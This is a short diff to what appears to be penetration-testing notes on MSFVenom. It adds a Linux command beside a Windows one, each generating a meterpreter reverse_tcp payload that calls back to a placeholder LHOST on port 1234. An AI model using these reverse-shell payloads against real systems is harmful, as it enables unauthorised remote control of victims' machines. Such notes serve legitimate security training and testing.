@@ -7,7 +7,11 @@ To see the available payloads: `msfvenom -l payloads`
 Build a payload with MSFVenom:
 
 ```
+# Windows:
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[local ip] LPORT=1234 -f exe > payload.exe
+
+# Linux:
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[local ip] LPORT=1234 -f elf > payload
 ```
 
 A staged payload will follow this syntax: 
